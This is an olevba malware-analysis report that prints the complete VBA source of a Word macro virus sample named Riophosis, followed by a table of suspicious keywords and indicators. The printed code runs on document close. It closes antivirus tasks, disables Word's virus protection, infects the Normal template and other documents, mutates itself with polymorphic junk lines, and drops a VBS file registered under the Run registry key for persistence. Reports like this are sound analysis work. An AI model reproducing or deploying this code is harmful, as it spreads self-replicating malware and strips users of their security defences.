olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Riophosis-61fb25fa500f1109ce14254e313cb777ecc3031d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Riophosis-61fb25fa500f1109ce14254e313cb777ecc3031d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub doCUMent_CLoSE()
For Each prOG In Tasks
If InStr(1, UCase(prOG.Name), Chr(78) & Chr(65) & Chr(86)) Then prOG.Close
If InStr(1, UCase(prOG.Name), Chr(65) & Chr(78) & Chr(84) & Chr(73) & Chr(86) & Chr(73) & Chr(82) & Chr(85) & Chr(83)) Then prOG.Close
Next
System.PrivateProfileString("", "hkeY_LoCAL_mACHinE\sOfTWAre\miCROSoFT\windowS\CURrentveRSiON\rUN\", "nAv AGent") = ""
BThhtrRgCFg = 122174.617662907 Or 684237.451576531  '
With Application
NoHkJo = 712368.431593716 And 76435.6087220907  '
.DisplayAlerts = wdAlertsNone
imRkfgQ = 278589.148881733 And 702969.444162726  '
.EnableCancelKey = wdCancelDisabled
With .Options
lFPJLHkbtQtNn = 110386.738062859 And 109738.418989956  '
.VirusProtection = 0
RINskdDlIMgL = 431599.662241459 And 732523.841278374  '
.ConfirmConversions = 0
lKglN = GoBPQ - iJILI '
ObQeFpqEhMM = 838557.239254117 - 640922.441905439  '
.SaveNormalPrompt = 0
End With
OflhLhdBIORo = 755259.712268829 + 822577.786411107  '
End With
If ThisDocument = ActiveDocument Then Set Target = NormalTemplate
OtKdrkJ = 297995.805767477 Or 968357.548334599  '
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument
SOURcEfiLE = Environ$("wiNdir") & "\RioPHoSis.SyS"
BCCqtMne = 875925.380253553 Or 151254.919908106  '
vBSBACKUp = Environ$("wINdiR") & "\rIOpHOSis.vbs"
dKGEC = 964229.155951917 + 833913.446023464  '
With ThisDocument.VBProject.vBcOMpoNentS(1).COdEModUlE
VCodE = UCase(.LiNeS(1, .COuNTOFLineS))
sPLjHTGLpQB = 903057.506632447 Xor 987948.442993104  '
pOlY
ibBCQKCG = irPNEMsA Xor reAFEMHr '
FQheiIPMhsdoIn = LJCeOqfKmHjQKT Or AkogClBndqAfAB '
For COuNTEr = 1 To Len(VCodE)
eqTQSmH = bGNGKGg Or piJDpTe '
SpQIBA = 656633.495301425 - 954210.996090174  '
t = Mid(VCodE, COuNTEr, 1)
MOBtSpdF = hoEDfPlR And MddNFhcN '
ABoBrQk = 792404.097655535 Or 430627.332643569  '
If Asc(t) < 90 And Asc(t) > 65 Then t = Chr(Asc(t) + Int(Rnd * 2) * 32)
gFetnGfhOpDA = 327555.865318716 Or 711708.787649632  '
newvCOdE = newvCOdE & t
Next
mFkdpgtsCS = rMMNSOTdPJ Or gHNsCfQsoS '
lobpJbii = AbQtnggQ And geePfemj '
Open SOURcEfiLE For Output As #1
Print #1, newvCOdE
LSLEIhblI = BFDGgSgef + CrRAmOhSS '
Close #1
SsHqcAgFigFNjD = rHJMNGNehhfKLb + rQqiClkitTeSGq '
Open vBSBACKUp For Output As #1
Print #1, "ON Error ReSuME NEXt"
clrBAeM = qfgGsMK - hhESdDe '
Print #1, "seT fsO = creAtEobJEct(""worD.APplicAtIOn"")"
Print #1, "wITh fso.OPtIONs"
AKjGieeHrog = JLeJPqAOptl Or bsTsCBELMft '
Print #1, ".vIrUSPRoTeCTION = 0"
Print #1, ".ConFIrmConVeRSIOns = 0"
nmskMhib = oBTPJgQn - qnmEkfHN '
Print #1, ".sAvenORmAlpRomPt = 0"
Print #1, ".APPLicATION.dispLAYAlERTS = wDAlERTsnone"
ARtRBANSEbl = PsdtGbSNmJr And kNFoEPCpLpq '
Print #1, "EnD wiTH"
pPdkH = 346882.413641989 - 332806.612040162  '
Print #1, "wiTh FSo.nOrmALtEMpLATE.vbprOjecT.VbCOmpOnEnTs(1)"
Print #1, ".CodeMoDule.DELeTELINEs 1, .CoDEmODULe.countofLINEs"
DsBGLA = EFjARj - PEJFcs '
Print #1, ".cOdEMODULe.AddFromFILe """ & SOURcEfiLE & """"
kILFBpIdmSqtj = 30584.3643473983 Or 948815.350622177  '
Print #1, "enD WiTH"
JlgGdQnnSrhoL = 440954.721093178 And 276236.436695874  '
Print #1, "Fso.nORmAlTEMPlATE.SAVe"
deDbPDbmE = 52894.4201813936 Xor 915881.731154859  '
Print #1, "FsO.QUit"
CNgfBCtkNi = 413425.389758706 - 619932.56802839  '
Close #1
TfTkN = JeOMJ Eqv OMPlB '
hTKApTOgt = 618059.4939394 - 537890.075188458  '
djFHDmpgGjqkkF = LlrqScgBAcreLf Xor HqbRSBkmPRIMiL '
iHRbsRnDTb = LDSMEhIsSF - BSNGObkgrJ '
System.PrivateProfileString("", "Hkey_LocAL_MAchINe\SOFtwARE\mICrosoFt\WinDOwS\CURRenTverSIon\RUN\", "RIOpHOsis") = vBSBACKUp
dEhhMsD = 738230.086239696 + 585703.085274875  '
LgsAOoAH = otPHdQmR Eqv HpntdsEq '
End With
GGEqBJQe = psFshehE + SHqIiDhs '
With Target.VBProject.vBcOMpoNentS(1).COdEModUlE
snABlJBO = mEQHFOhi Or PAdLQlFq '
gOELfRb = RAlDtKb Or ACkBKLH '
.DeleTElINES 1, .COuNTOFLineS
sOlQSrMB = FIOsqmTI Or RtmGOADo '
.AddFromFile SOURcEfiLE
KjiFpRCjrpn = HOCEHNejLMO - nTlLBLDGpnc '
End With
bTHrThILCR = 623538.585826635 Eqv 667204.606899798  '
hgtqSD = 932955.464577019 + 178833.901862025  '
End Sub
Private Sub pOlY()
With ThisDocument.VBProject.vBcOMpoNentS(1).COdEModUlE
IrLnt = bSpJG - lgplr '
For i = 1 To .COuNTOFLineS
nJrJTCrlSk = 518319.922925591 Xor 186108.462668359  '
A = Int(Rnd * 6) + 1
If A = 1 Then OPer = Space(1) & "xor" & Space(1)
ABTMA = SSIpA Eqv SimEP '
If A = 2 Then OPer = Space(1) & "And" & Space(1)
thJQBERKiCs = LEiRJoRcplh Or pArqEGFDBtJ '
If A = 3 Then OPer = Space(1) & "Or" & Space(1)
CSjspgPB = BKsMhklD + AqnFTRdj '
If A = 4 Then OPer = Space(1) & "+" & Space(1)
pnnSHnMk = SGnsOPsj Xor hoRPiAjn '
If A = 5 Then OPer = Space(1) & "-" & Space(1)
If A = 6 Then OPer = Space(1) & "eQV" & Space(1)
LOoCATGolN = 218693.812544525 - 137661.08098197  '
A = Int(Rnd * 2) + 1
For ii = 1 To 5 + Int(Rnd * 10)
nrLoNqsJelArD = 146328.89896667 And 160236.973265827  '
JUNK1 = JUNK1 & Chr(Int(Rnd * 20) + 97)
If A = 1 Then JUNk2 = JUNk2 & Chr(Int(Rnd * 20) + 97)
JlDHKEq = 172567.671823025 Or 88722.7959321141  '
If A = 2 Then JUNk2 = Space(1) & Rnd * 999999 & Space(1)
If A = 1 Then JUnk3 = JUnk3 & Chr(Int(Rnd * 20) + 97)
JqAlNPJIeHK = lLgSBeblNjQ - IiogJtobqOK '
jJBcNqG = pdOBtAh - PlnAHNR '
If A = 2 Then JUnk3 = Space(1) & Rnd * 999999 & Space(1)
Next
ijqrO = RRcEJ + tlLkA '
If Right(.LiNeS(i, 1), Len(i) - 1) = "'" Then .REPlAcelIne i, JUNK1 & "=" & JUNk2 & OPer & JUnk3 & "'"
JUNK1 = ""
BjIcQntHtNEfh = dfcfAKCgqQSfl - QFiImBtiAOTtS '
JUNk2 = ""
EPLilllhM = kNroKNGlC Xor noEPgeLtq '
JUnk3 = ""
ThHLHL = IpMSgs - ElkfMt '
Next
ceefpGMJbAr = 464736.354530454 And 531917.576545179  '
End With
KMiliEEHrJB = SeotDeEBkpf + kJlNrmGKhsb '
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |doCUMent_CLoSE      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|rUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|creAtEobJEct        |May create an OLE object                     |
|Suspicious|windowS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vBcOMpoNentS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|COdEModUlE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |rIOpHOSis.vbs       |Executable file name                         |
|Hex String|DAbr                |44416272                                     |
|Hex String|f"AE                |66224145                                     |
|Hex String|D`#F                |44602346                                     |
|Hex String|Pf2D                |50663244                                     |
|Hex String|        vUS         |09765553                                     |
|Hex String|3&CV                |33264356                                     |
|Hex String|xvIc                |78764963                                     |
|Hex String|XX&c                |58582663                                     |
|Hex String|F&h5                |46266835                                     |
|Hex String|5E0E                |35453045                                     |
+----------+--------------------+---------------------------------------------+

